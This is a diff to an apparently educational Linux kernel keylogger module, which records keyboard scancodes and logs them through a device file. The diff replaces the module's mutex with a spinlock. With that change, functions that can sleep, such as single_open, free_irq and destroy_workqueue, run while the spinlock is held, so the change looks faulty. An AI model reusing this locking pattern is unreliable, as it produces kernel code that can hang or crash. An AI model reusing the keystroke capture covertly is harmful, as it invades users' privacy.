@@ -63,6 +63,7 @@ struct key_log_index {
 static struct key_log_index	*key_full_log;
 
 DEFINE_MUTEX(lock);
+DEFINE_SPINLOCK(slock);
 
 static struct key_log_index	*key_log_create_page(struct key_log_index *next)
 {
@@ -252,10 +253,12 @@ static int	open_key(struct inode *node, struct file *file)
 	int	ret;
 
 	pr_info("device open.\n");
-	mutex_lock(&lock);
+	// mutex_lock(&lock);
+	spin_lock(&slock);
 	pr_info("single open\n");
 	ret = single_open(file, &key_prepare_show, NULL);
-	mutex_unlock(&lock);
+	// mutex_unlock(&lock);
+	spin_unlock(&slock);
 	return ret;
 }
 
@@ -336,7 +339,8 @@ static void		key_job(struct work_struct *work)
 	unsigned int		scancode = task->scancode;
 	struct key_map		*key;
 
-	mutex_lock(&lock);
+	// mutex_lock(&lock);
+	spin_lock(&slock);
 	key = get_key(scancode & 0x7f);
 	if (key) {
 		key->pressed = (scancode & 0x80) == 0;
@@ -347,7 +351,8 @@ static void		key_job(struct work_struct *work)
 		pr_info("(scan: %3u : %3u) -> %s\n", scancode, scancode & 0x7f,
 			((scancode & 0x80) == 0 ? "pressed" : "released"));
 	}
-	mutex_unlock(&lock);
+	spin_unlock(&slock);
+	// mutex_unlock(&lock);
 	kfree(task);
 }
 
@@ -400,7 +405,8 @@ static void		key_log_print_unified(void)
 static void		__exit keylogger_clean(void)
 {
 	pr_info(MODULE_NAME "Cleaning up module.\n");
-	mutex_lock(&lock);
+	// mutex_lock(&lock);
+	spin_lock(&slock);
 	key_log_print_unified();
 	free_irq(KEYBOARD_IRQ, &key_handler);
 	misc_deregister(&dev);
@@ -409,7 +415,8 @@ static void		__exit keylogger_clean(void)
 		destroy_workqueue(workqueue);
 	}
 	key_log_clean();
-	mutex_unlock(&lock);
+	// mutex_unlock(&lock);
+	spin_unlock(&slock);
 }
 
 static int		__init hello_init(void)
